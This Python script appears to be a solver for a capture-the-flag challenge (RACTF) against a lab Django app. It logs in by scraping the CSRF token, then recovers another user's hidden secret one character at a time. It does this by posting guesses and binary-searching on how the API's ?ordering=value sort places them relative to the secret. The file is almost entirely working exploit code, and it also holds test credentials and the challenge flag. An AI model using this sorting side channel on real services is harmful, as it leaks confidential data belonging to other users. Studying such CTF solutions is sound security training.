import requests
import json
import math

# ractf{a-zA-Z0-9_-}
CHARSET = '-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz}*'
# FLAG_PREFIX = 'ractf{'
FLAG_PREFIX = 'ractf{data_exf1l_via_s0rt1ng_0c66de4'
# FLAG_PREFIX = 'ractf{data_exf1l_via_s0rt1ng'
FLAG_SEC_ID = 1

username = 'nep2'
password = 'neptunian20'

username1 = 'nep1'
password1 = 'neptunian20'

username2 = 'nep2'
password2 = 'neptunian20'

host = 'http://localhost:8000'
# host = 'http://193.57.159.27:21627'

### Get create logged session
def get_session(username, password):
    print("=============> START SESSION for {}".format(username))

    session = requests.Session()

    ### Get CRFS TOKEN
    response = session.get('{}/auth/login/'.format(host))
    print('Login GET: ', response.status_code)
    print(session.cookies)

    CRFS_START = 'name="csrfmiddlewaretoken" value="'
    CRFS_END = '">'

    login_page = response.text

    idx1 = login_page.find(CRFS_START)+len(CRFS_START)
    idx2 = login_page[idx1:].find(CRFS_END)
    crsf_token = login_page[idx1:idx1+idx2]

    print("CRFS TOKEN: ", crsf_token)

    ### Login
    print("=============> LOGIN")
    data = {
    'csrfmiddlewaretoken': crsf_token,
    'username': username,
    'password': password
    }

    # response = session.post('{}/auth/login/'.format(host), cookies={'csrftoken': session.cookies['csrftoken']}, data=data)
    response = session.post('{}/auth/login/'.format(host), data=data)

    print('Login POST: ', response.status_code)

    return session

### Send Secret
def send_secret(session, secret_value):
    # print("=============> POST SECRET")
    # print(secret_value)
    secret = {'value': secret_value}
    response = session.post('{}/api/secret/'.format(host), json=secret, headers={'X-CSRFToken': session.cookies['csrftoken']})
    # print('POST /api/secret/', response.status_code)

    return json.loads(response.text)


### Get All Secrets
def get_all_secrets(session, sec_id_filter):
    # print("=============> GET ALL SECRETS")
    response = session.get('{}/api/secret/?format=json&ordering=value'.format(host))
    # print('GET /api/secret/', response.status_code)

    all_secrets = json.loads(response.text)

    result = [sec['id'] for sec in all_secrets if sec['id'] in sec_id_filter]  

    return result

# Binary Search
def binarySearch(minValue, maxValue, targetFunc, params):
    minSize = minValue
    maxSize = maxValue

    while maxSize > minSize:
        current = math.ceil((minSize + maxSize) / 2)

        params['min'] = minValue
        params['max'] = maxValue
        params["value"] = current

        if targetFunc(params):
            minSize = current
            current = math.ceil((minSize + maxSize) / 2)
        else:
            maxSize = current-1

    return minSize

def get_char(pos):
    return CHARSET[pos]

def test_char(params):
    session = params['session']
    current_flag = params['current']
    charpos = params['value']

    current_ch = get_char(charpos)

    sec = send_secret(session, current_flag+current_ch)
    all_secs = get_all_secrets(session, [FLAG_SEC_ID, sec['id']])

    return all_secs.index(FLAG_SEC_ID) > all_secs.index(sec['id'])

def print_status(current_flag):
    print("CURRENT FLAG: {}".format(current_flag))

def brute_next_char(session, current):
    return binarySearch(
        minValue=0,
        maxValue=len(CHARSET)-1,
        targetFunc=test_char, 
        params={
            'session': session,
            'current': current
        }
    )

def bruteFlag(session, prefix):
    current = FLAG_PREFIX
    ch_found = '{'

    while (ch_found != '}'):
        found = brute_next_char(session, current)
        ch_found = get_char(found)
        current = current + ch_found
        print_status(current)


if __name__ == '__main__':
    # Sample Flag
    s1 = get_session(username1, password1)
    sec1 = send_secret(s1, "ractf{data_exf1l_via_s0rt1ng_0c66de47}") # before 'r'(actf{)
    print(sec1)

    brute_session = get_session(username, password)
    bruteFlag(brute_session, FLAG_PREFIX)